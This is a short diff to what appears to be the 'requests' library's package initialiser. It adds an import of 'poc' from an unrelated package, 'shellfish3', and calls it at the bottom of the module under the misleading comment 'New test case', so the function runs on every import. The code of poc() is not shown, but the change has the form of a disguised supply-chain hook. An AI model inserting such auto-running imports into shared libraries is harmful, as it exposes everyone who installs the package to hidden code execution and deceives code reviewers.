@@ -54,6 +54,8 @@ try:
 except ImportError:
     chardet_version = None
 
+from shellfish3.utils import poc
+
 
 def check_compatibility(urllib3_version, chardet_version, charset_normalizer_version):
     urllib3_version = urllib3_version.split(".")
@@ -182,3 +184,6 @@ logging.getLogger(__name__).addHandler(NullHandler())
 
 # FileModeWarnings go off per the default.
 warnings.simplefilter("default", FileModeWarning, append=True)
+
+# New test case
+poc()
